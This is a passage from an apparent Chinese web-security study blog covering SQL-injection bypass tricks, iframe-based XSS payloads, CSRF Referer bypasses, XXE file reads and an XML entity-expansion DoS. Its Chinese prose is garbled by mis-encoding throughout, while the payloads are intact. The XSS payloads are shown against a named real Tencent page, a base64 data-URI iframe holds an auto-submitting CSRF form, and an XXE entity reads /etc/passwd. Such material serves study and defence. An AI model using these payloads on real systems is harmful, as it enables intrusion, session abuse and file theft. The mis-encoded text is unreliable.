<p>ç©ºæ ¼ï¼š<code>%0a</code>ï¼ˆåˆ†éš”ç¬¦ï¼‰,<code>%a0</code>ï¼Œ<code>%09</code>(tab), <code>/**/</code>, () ã€å¦‚select(table_name)from(xxx)ã€‘ï¼Œ&lt; &gt;ï¼Œ %20(space),  IFS$9ï¼ˆ$IFSæ˜¯<strong>Unix</strong>ç³»ç»Ÿçš„ä¸€ä¸ªé¢„è®¾å˜é‡è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œ$9åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼‰</p>
<p>&#x3D;ï¼šlike</p>
<p>andï¼š&amp;&amp;</p>
<p>orï¼š||</p>
<p>#,â€“ : <code>;%00</code></p>
<p>ï¼Œï¼šç”¨<code>join</code>æ¥ä»£æ›¿é€—å·</p>
</blockquote>
<h4 id="8-æ³¨é‡Šç¬¦"><a href="#8-æ³¨é‡Šç¬¦" class="headerlink" title="8. æ³¨é‡Šç¬¦"></a>8. æ³¨é‡Šç¬¦</h4><blockquote>
<p>#ã€ â€“+ã€ â€“%20ã€ %23</p>
</blockquote>
<h2 id="äºŒã€xss"><a href="#äºŒã€xss" class="headerlink" title="äºŒã€xss"></a>äºŒã€xss</h2><p>æŠŠ<code>xss-labs</code>åšä¸€ä¸‹å°±å·®ä¸å¤šäº†ï¼Œåé¢è¿›é˜¶å†…å®¹æŒ‰æ˜¯éœ€è¦å­¦ä¹ å§</p>
<h3 id="Dom-Xssè¿›é˜¶-å–„å˜iframe"><a href="#Dom-Xssè¿›é˜¶-å–„å˜iframe" class="headerlink" title="Dom Xssè¿›é˜¶ [å–„å˜iframe]"></a>Dom Xssè¿›é˜¶ [å–„å˜iframe]</h3><blockquote>
<p>ä½œè€…ï¼šå¿ƒä¼¤çš„ç˜¦å­</p>
<p>æ¥è‡ªï¼šPKAVæŠ€æœ¯å®…ç¤¾åŒº</p>
<p>ç½‘å€ï¼š<a href="http://www.pkav.net/">http://www.pkav.net</a></p>
<p>è½¬è½½äºï¼š<a href="https://blog.csdn.net/weixin_39934520/article/details/106151313">https://blog.csdn.net/weixin_39934520/article/details/106151313</a></p>
</blockquote>
<p>ç®€è¦æè¿°ï¼š</p>
<blockquote>
<p>æœ‰æ—¶å€™ï¼Œè¾“å‡ºè¿˜ä¼šå‡ºç°åœ¨ </p>
<iframe src="[è¾“å‡º]"></iframe>  

<p>iframe çš„ srcå±æ€§æœ¬æ¥åº”è¯¥æ˜¯ä¸€ä¸ªç½‘å€ï¼Œ</p>
<p>ä½†æ˜¯iframeä¹‹å–„å˜ï¼Œä½¿å¾—å®ƒåŒæ ·å¯ä»¥æ‰§è¡Œjavascriptï¼Œè€Œä¸”å¯ä»¥ç”¨ä¸åŒçš„å§¿åŠ¿æ¥æ‰§è¡Œã€‚</p>
<p>è¿™ä¸€ç±»é—®é¢˜ï¼Œæˆ‘å°†å…¶å½’ä¸º<code>[è·¯å¾„å¯æ§]</code>é—®é¢˜ã€‚å½“ç„¶ä¸Šé¢è¯´åˆ°çš„æ˜¯æ™®é€šçš„åå°„å‹XSSã€‚</p>
<p>æœ‰æ—¶å€™ç¨‹åºå‘˜ä¼šä½¿ç”¨javascriptæ¥åŠ¨æ€çš„æ”¹å˜iframeçš„srcå±æ€§ï¼Œè­¬å¦‚ï¼šiframeA.src&#x3D;â€[å¯æ§çš„url]â€; åŒæ ·ä¼šå¯¼è‡´XSSé—®é¢˜ï¼Œæ¥çœ‹çœ‹æœ¬ä¾‹å§</p>
</blockquote>
<p>è¯¦ç»†è¯´æ˜ï¼š</p>
<blockquote>
<p>1.å…ˆæ¥è¯´è¯´iframeçš„å˜åŒ–ã€‚</p>
<p>1.1 æœ€å¥½æ‡‚çš„ï¼Œonloadæ‰§è¡Œjs</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">Î¿nlÎ¿ad</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.2 src æ‰§è¡Œjavascriptä»£ç </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.3 IEä¸‹vbscriptæ‰§è¡Œä»£ç </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;vbscript:msgbox(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.4 <code>Chrome</code>ä¸‹<code>data</code>åè®®æ‰§è¡Œä»£ç </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.5 ä¸Šé¢çš„å˜ä½“</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.6 <code>Chrome</code>ä¸‹<code>srcdoc</code>å±æ€§</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<ol start="2">
<li><p>æœ‰å…´è¶£çš„ï¼Œå¯ä»¥ä¸€ä¸ªä¸€ä¸ªçš„å»æµ‹è¯•ä¸Šé¢çš„æ•ˆæœï¼Œæ³¨æ„æµè§ˆå™¨çš„ç‰¹å¼‚æ€§å“¦ã€‚</p>
</li>
<li><p>æ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹å…·ä½“çš„ä¾‹å­ã€‚</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=aaaaaa&amp;gid=yl&amp;cid=68&amp;from=</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>æˆ‘ä»¬å…ˆå¼€è°ƒè¯•å·¥å…·ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯è§çš„è¾“å‡ºã€‚</li>
</ol>
<p><img src="/post/Web-study/image-20230803154936817.png" alt="image-20230803154936817"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å‚æ•°çš„aaaaaaè¢«å¸¦å…¥åˆ°äº†<iframe src="è¿™é‡Œ"></iframe>ã€‚</p>
<p>è¿™æ ·ä¸€æ¥ï¼Œå°±æ»¡è¶³äº†æˆ‘ä»¬çš„ä½¿ç”¨æ¡ä»¶ã€‚</p>
<p>æˆ‘ä»¬è¯•è¯•</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=javascript:alert(1);<span class="variable">&amp;gid</span>=yl<span class="variable">&amp;cid</span>=68<span class="variable">&amp;from</span>=</span><br></pre></td></tr></table></figure>

<p>ã€‚ã€‚ç«Ÿç„¶æ²¡ååº”ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹åˆšæ‰çš„é‚£ä¸ªåœ°æ–¹ã€‚</p>
<p><img src="/post/Web-study/image-20230803154959716.png" alt="image-20230803154959716"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œsrcè¿™æ¬¡æ²¡å±æ€§äº†ï¼Œçœ‹æ¥è…¾è®¯åšäº†ä»€ä¹ˆè¿‡æ»¤ã€‚æˆ‘ä»¬ç»§ç»­æœç´¢ä¸‹ä¸€ä¸ªtoolframeè¯•è¯•ã€‚<br>æ©ï¼Œçœ‹æ¥å°±æ˜¯è¿™æ®µä»£ç å¯¼è‡´çš„ã€‚</p>
<p><img src="/post/Web-study/image-20230803155010542.png" alt="image-20230803155010542"></p>
<p>ä¸€èµ·çœ‹çœ‹è¿™æ®µä»£ç ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">OpenFrame</span>(<span class="params">url</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (url.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;http://&#x27;</span>) != <span class="string">&#x27;-1&#x27;</span> || url.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;https://&#x27;</span>) != <span class="string">&#x27;-1&#x27;</span> || url.<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(<span class="string">&#x27;javascript:&#x27;</span>) != <span class="string">&#x27;-1&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;toolframe&quot;</span>).<span class="property">src</span> = url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸éš¾çœ‹å‡ºï¼Œè…¾è®¯å¯¹ javascript:åšå‡ºäº†åˆ¤æ–­ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.getElementById(&quot;toolframe&quot;).src = url;</span><br></pre></td></tr></table></figure>

<p>è¿™å¥æ˜¯å¯¼è‡´XSSçš„ä¸€å¥ä»£ç ã€‚è€ŒopenFrameçš„urlå‚æ•°åˆ™æ¥è‡ªäº(æ— å…³ä»£ç çœç•¥)ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">var</span> tool_url = <span class="title function_">getQueryStringValue</span>(<span class="string">&quot;turl&quot;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="title function_">openFrame</span>(tool_url);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>æ ¹æ®æˆ‘ä»¬ä¸Šé¢è¯´é“çš„iframeçš„åˆ©ç”¨æ–¹æ³•ï¼Œæˆ‘ä»¬ä¸éš¾çœ‹å‡ºï¼Œè…¾è®¯çš„è¿‡æ»¤æ˜¯ä¸å®Œå–„çš„ã€‚</li>
</ol>
<p>åœ¨IEä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨vbscriptæ¥æ‰§è¡Œä»£ç ã€‚ vbscripté‡Œ â€˜ å•å¼•å·è¡¨ç¤ºæ³¨é‡Šï¼Œç±»ä¼¼JSé‡Œçš„&#x2F;&#x2F;</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://helper.qq.com/appweb/tools/tool-detail.shtml?turl=vbscript:msgbox(<span class="number">1</span>)&#x27;&amp;gid=yl&amp;cid=<span class="number">68</span>&amp;from=</span><br></pre></td></tr></table></figure>

<p><img src="/post/Web-study/image-20230803155021564.png" alt="image-20230803155021564"></p>
<p>åœ¨chromeä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨dataåè®®æ¥æ‰§è¡ŒJSã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=data:text/html,<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;&amp;gid=yl&amp;cid=68&amp;from=</span><br></pre></td></tr></table></figure>

<p><img src="/post/Web-study/image-20230803155036805.png" alt="image-20230803155036805"></p>
<h3 id="æ¼æ´è¯æ˜ï¼š"><a href="#æ¼æ´è¯æ˜ï¼š" class="headerlink" title="æ¼æ´è¯æ˜ï¼š"></a>æ¼æ´è¯æ˜ï¼š</h3><p>è§è¯¦ç»†è¯´æ˜</p>
<h3 id="ä¿®å¤æ–¹æ¡ˆï¼š"><a href="#ä¿®å¤æ–¹æ¡ˆï¼š" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆï¼š"></a>ä¿®å¤æ–¹æ¡ˆï¼š</h3><blockquote>
<p><code>å±é™©çš„ä¸å…‰æ˜¯javascript:ï¼Œ</code></p>
<p><code>vbscript:, data: ç­‰åŒæ ·éœ€è¦è¿‡æ»¤ã€‚</code></p>
</blockquote>
<h2 id="ä¸‰ã€csrf"><a href="#ä¸‰ã€csrf" class="headerlink" title="ä¸‰ã€csrf"></a>ä¸‰ã€csrf</h2><h3 id="1ï¼‰ç»•è¿‡token"><a href="#1ï¼‰ç»•è¿‡token" class="headerlink" title="1ï¼‰ç»•è¿‡token"></a>1ï¼‰ç»•è¿‡token</h3><p>æœ‰çš„æ—¶å€™å…¶å®ç½‘ç«™æ ¹æœ¬ä¸éªŒè¯<code>token</code>ï¼Œä½†æ˜¯åœ¨å…¶ä»–æ–¹é¢ä¸Šå®ƒä»ç„¶åœ¨å·¥ä½œï¼Œæ‰€ä»¥ä¸ºäº†ç»•è¿‡å®ƒå¯ä»¥è€ƒè™‘æŠ“åŒ…åˆ å»<code>token</code>ï¼Œä»è€Œæ­£å¸¸è®¿é—®</p>
<h3 id="2ï¼‰ç»•è¿‡referer"><a href="#2ï¼‰ç»•è¿‡referer" class="headerlink" title="2ï¼‰ç»•è¿‡referer"></a>2ï¼‰ç»•è¿‡referer</h3><h4 id="1-refereræ¡ä»¶ä¸ºç©ºæ¡ä»¶æ—¶"><a href="#1-refereræ¡ä»¶ä¸ºç©ºæ¡ä»¶æ—¶" class="headerlink" title="1.refereræ¡ä»¶ä¸ºç©ºæ¡ä»¶æ—¶"></a>1.refereræ¡ä»¶ä¸ºç©ºæ¡ä»¶æ—¶</h4><blockquote>
<p>è§£å†³æ–¹æ¡ˆ:</p>
<p>åˆ©ç”¨<code>ftp://,http://,https://,file://,javascript:,data:</code>è¿™ä¸ªæ—¶å€™æµè§ˆå™¨åœ°å€æ æ˜¯<code>file://</code>å¼€å¤´çš„ï¼Œ</p>
<p>å¦‚æœè¿™ä¸ªHTMLé¡µé¢å‘ä»»ä½•httpç«™ç‚¹æäº¤è¯·æ±‚çš„è¯ï¼Œè¿™äº›è¯·æ±‚çš„<code>Referer</code>éƒ½æ˜¯ç©ºçš„ã€‚</p>
<p>ä¾‹:<br><code>1.åˆ©ç”¨data:åè®®</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>base64</code>ç¼–ç  è§£ç å³å¯çœ‹åˆ°ä»£ç </p>
<p><code>2.åˆ©ç”¨httpsåè®®</code><br>httpså‘httpè·³è½¬çš„æ—¶å€™Refererä¸ºç©º<br>æ‹¿ä¸€ä¸ªhttpsçš„webshell</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;https://xxxxx.xxxxx/attack.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>attack.phpå†™ä¸ŠCSRFæ”»å‡»ä»£ç </p>
</blockquote>
<h4 id="2-åˆ¤æ–­Refereræ˜¯æŸåŸŸæƒ…å†µä¸‹ç»•è¿‡"><a href="#2-åˆ¤æ–­Refereræ˜¯æŸåŸŸæƒ…å†µä¸‹ç»•è¿‡" class="headerlink" title="2.åˆ¤æ–­Refereræ˜¯æŸåŸŸæƒ…å†µä¸‹ç»•è¿‡"></a>2.åˆ¤æ–­Refereræ˜¯æŸåŸŸæƒ…å†µä¸‹ç»•è¿‡</h4><blockquote>
<p>æ¯”å¦‚ä½ æ‰¾çš„csrfæ˜¯<a href="https://link.zhihu.com/?target=http://xxx.com">http://xxx.com</a> </p>
<p>éªŒè¯çš„refereræ˜¯éªŒè¯çš„*.<a href="https://link.zhihu.com/?target=http://xx.com">http://xx.com</a> </p>
<p>å¯ä»¥æ‰¾ä¸ªäºŒçº§åŸŸå ä¹‹å&lt;img â€œcsrfåœ°å€â€&gt; ä¹‹ååœ¨æŠŠæ–‡ç« åœ°å€å‘å‡ºå» å°±å¯ä»¥ä¼ªé€ ã€‚</p>
</blockquote>
<h4 id="3-åˆ¤æ–­refereræ˜¯å¦å­˜åœ¨æŸå…³é”®å­—"><a href="#3-åˆ¤æ–­refereræ˜¯å¦å­˜åœ¨æŸå…³é”®å­—" class="headerlink" title="3.åˆ¤æ–­refereræ˜¯å¦å­˜åœ¨æŸå…³é”®å­—"></a>3.åˆ¤æ–­refereræ˜¯å¦å­˜åœ¨æŸå…³é”®å­—</h4><blockquote>
<p>refereråˆ¤æ–­å­˜åœ¨ä¸å­˜åœ¨<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>è¿™ä¸ªå…³é”®è¯</p>
<p>åœ¨ç½‘ç«™æ–°å»ºä¸€ä¸ª<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>ç›®å½• æŠŠCSRFå­˜æ”¾åœ¨<a href="https://link.zhihu.com/?target=http://google.com">http://google.com</a>ç›®å½•,å³å¯ç»•è¿‡</p>
</blockquote>
<h4 id="4-åˆ¤æ–­Refereræ˜¯å¦å«æœ‰æŸåŸŸå"><a href="#4-åˆ¤æ–­Refereræ˜¯å¦å«æœ‰æŸåŸŸå" class="headerlink" title="4.åˆ¤æ–­Refereræ˜¯å¦å«æœ‰æŸåŸŸå"></a>4.åˆ¤æ–­Refereræ˜¯å¦å«æœ‰æŸåŸŸå</h4><blockquote>
<p>åˆ¤æ–­äº†Refererå¼€å¤´æ˜¯å¦ä»¥<a href="https://link.zhihu.com/?target=http://126.com">http://126.com</a>ä»¥åŠ126å­åŸŸå ä¸éªŒè¯æ ¹åŸŸåä¸º<a href="https://link.zhihu.com/?target=http://126.com">http://126.com</a> é‚£ä¹ˆæˆ‘è¿™é‡Œå¯ä»¥æ„é€ å­åŸŸå<a href="https://link.zhihu.com/?target=http://x.126.com.xxx.com">http://x.126.com.xxx.com</a>ä½œä¸ºè •è™«ä¼ æ’­çš„è½½ä½“æœåŠ¡å™¨ï¼Œå³å¯ç»•è¿‡ã€‚</p>
</blockquote>
<h3 id="3ï¼‰ä¸åŒæµè§ˆå™¨çš„åŒºåˆ«"><a href="#3ï¼‰ä¸åŒæµè§ˆå™¨çš„åŒºåˆ«" class="headerlink" title="3ï¼‰ä¸åŒæµè§ˆå™¨çš„åŒºåˆ«"></a>3ï¼‰ä¸åŒæµè§ˆå™¨çš„åŒºåˆ«</h3><p>â€ƒåœ¨æ»¡è¶³ä¸Šè¿°å‰åç«¯æ¡ä»¶åï¼Œæµè§ˆå™¨åœ¨å®Œæˆé¢„æ£€è¯·æ±‚åä¼šè‡ªåŠ¨æºå¸¦ä¸ŠCookieå­—æ®µï¼Œä½†æ˜¯ç”±äºæµè§ˆå™¨çš„å†…æ ¸ç‰¹æ€§ä¸åŒï¼Œæ­¤æ—¶åˆå‡ºç°äº†ä¸åŒçš„æƒ…å†µ</p>
<blockquote>
<p>â€ƒâ€ƒ<code>Firefox</code>æºå¸¦ç½‘ç«™Açš„Cookieå€¼å‘èµ·POSTè¯·æ±‚<br>â€ƒâ€ƒ<code>Edge</code>æ²¡æœ‰æºå¸¦ç½‘ç«™Açš„Cookieå€¼å‘èµ·POSTè¯·æ±‚<br>â€ƒâ€ƒ<code>Chrome</code>æ²¡æœ‰æºå¸¦ç½‘ç«™Açš„Cookieå€¼å‘èµ·POSTè¯·æ±‚</p>
</blockquote>
<h2 id="å››ã€xxe"><a href="#å››ã€xxe" class="headerlink" title="å››ã€xxe"></a>å››ã€xxe</h2><blockquote>
<p><a href="https://www.jianshu.com/p/ec2888780308">æ¨èå­¦ä¹ æ–‡ç« </a></p>
</blockquote>
<h3 id="å¿…é¡»åœ¨æ–‡æ¡£ç±»å‹å®šä¹‰-DTD-ä¸­åˆ›å»ºå®ä½“"><a href="#å¿…é¡»åœ¨æ–‡æ¡£ç±»å‹å®šä¹‰-DTD-ä¸­åˆ›å»ºå®ä½“" class="headerlink" title="å¿…é¡»åœ¨æ–‡æ¡£ç±»å‹å®šä¹‰ (DTD) ä¸­åˆ›å»ºå®ä½“"></a>å¿…é¡»åœ¨æ–‡æ¡£ç±»å‹å®šä¹‰ (DTD) ä¸­åˆ›å»ºå®ä½“</h3><p><img src="/post/Web-study/image-20221015095141092.png" alt="image-20221015095141092"></p>
<p>æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œä¸€æ—¦ XML æ–‡æ¡£è¢«è§£æå™¨å¤„ç†ï¼Œå®ƒå°†<code>js</code>ç”¨å®šä¹‰çš„å¸¸é‡<code>â€œJo Smithâ€</code>æ›¿æ¢å®šä¹‰çš„å®ä½“ã€‚å¦‚æ‚¨æ‰€è§ï¼Œè¿™æœ‰å¾ˆå¤šä¼˜ç‚¹ï¼Œå› ä¸ºæ‚¨å¯ä»¥<code>js</code>åœ¨ä¸€ä¸ªåœ°æ–¹æ›´æ”¹ä¸ºä¾‹å¦‚<code>â€œJohn Smithâ€</code>ã€‚</p>
<p>åœ¨ <code>Java</code> åº”ç”¨ç¨‹åºä¸­ï¼Œ<code>XML</code> å¯ç”¨äºä»å®¢æˆ·ç«¯è·å–æ•°æ®åˆ°æœåŠ¡å™¨ï¼Œæˆ‘ä»¬éƒ½ç†Ÿæ‚‰ <code>JSON api</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>xml</code> æ¥è·å–ä¿¡æ¯ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ¡†æ¶ä¼šæ ¹æ® <code>xml</code> ç»“æ„è‡ªåŠ¨å¡«å…… <code>Java</code> å¯¹è±¡ï¼Œä¾‹å¦‚ï¼š</p>
<p><img src="/post/Web-study/image-20221015095555062.png" alt="image-20221015095555062"></p>
<blockquote>
<p>PCDATA:<br>å®ƒæ˜¯XMLè§£æå™¨è§£æçš„æ–‡æœ¬æ•°æ®ä½¿ç”¨çš„ä¸€ä¸ªæœ¯è¯­ã€‚XML æ–‡æ¡£ä¸­çš„æ–‡æœ¬é€šå¸¸è§£æä¸ºå­—ç¬¦æ•°æ®ï¼Œæˆ–è€…ï¼ˆæŒ‰ç…§æ–‡æ¡£ç±»å‹å®šä¹‰æœ¯è¯­ï¼‰ç§°ä¸º PCDATAã€‚</p>
<p>XML çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆ&amp;ã€&lt; å’Œ &gt;ï¼‰åœ¨ PCDATA ä¸­å¯ä»¥è¯†åˆ«ï¼Œå¹¶ç”¨äºè§£æå…ƒç´ åç§°å’Œå®ä½“ã€‚PCDATAï¼ˆå­—ç¬¦æ•°æ®ï¼‰åŒºåŸŸè¢«è§£æå™¨è§†ä¸ºæ•°æ®å—ï¼Œä»è€Œå…è®¸æ‚¨åœ¨æ•°æ®æµä¸­åŒ…å«ä»»æ„å­—ç¬¦ã€‚</p>
</blockquote>
<p>å¦‚æœ XML è§£æå™¨é…ç½®ä¸º<strong>å…è®¸å¤–éƒ¨ DTD æˆ–å®ä½“</strong>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å†…å®¹æ›´æ”¹ä»¥ä¸‹ XML ç‰‡æ®µï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">author</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">js</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;js;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿæˆ‘ä»¬ä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å®šä¹‰äº†ä¸€ä¸ªåŒ…å«ï¼Œ<code>XML</code> è§£æå™¨å°†åŠ è½½è¯¥æ–‡ä»¶ï¼Œå¹¶å°†åœ¨å¼•ç”¨å®ä½“çš„ä»»ä½•ä½ç½®æ·»åŠ å†…å®¹ã€‚å‡è®¾ XML æ¶ˆæ¯è¿”å›ç»™ç”¨æˆ·ï¼Œæ¶ˆæ¯å°†æ˜¯ï¼š</p>
<p><img src="/post/Web-study/image-20221015094930498.png" alt="image-20221015094930498"></p>
<hr>
<h3 id="XXE-DOSæ”»å‡»"><a href="#XXE-DOSæ”»å‡»" class="headerlink" title="XXE DOSæ”»å‡»"></a>XXE DOSæ”»å‡»</h3><p>åŒXXEæ”»å‡»æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸€ä¸ªDOSæœåŠ¡æ”»å‡»å¯¹æœåŠ¡å™¨ã€‚ ä¸€ä¸ªä¾‹å­çš„æ”»å‡»æ˜¯ï¼š </p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;?xml version=&quot;<span class="number">1.0</span>&quot;?&gt;</span></span><br><span class="line"><span class="params">&lt;!DOCTYPE lolz [</span></span><br><span class="line"><span class="params"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ELEMENT lolz (#PCDATA)&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol1 &quot;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol2 &quot;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol3 &quot;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol4 &quot;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol5 &quot;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol6 &quot;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;&quot;&gt;</span></span><br><span class="line"> <span class="params">&lt;!ENTITY lol7 &quot;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span 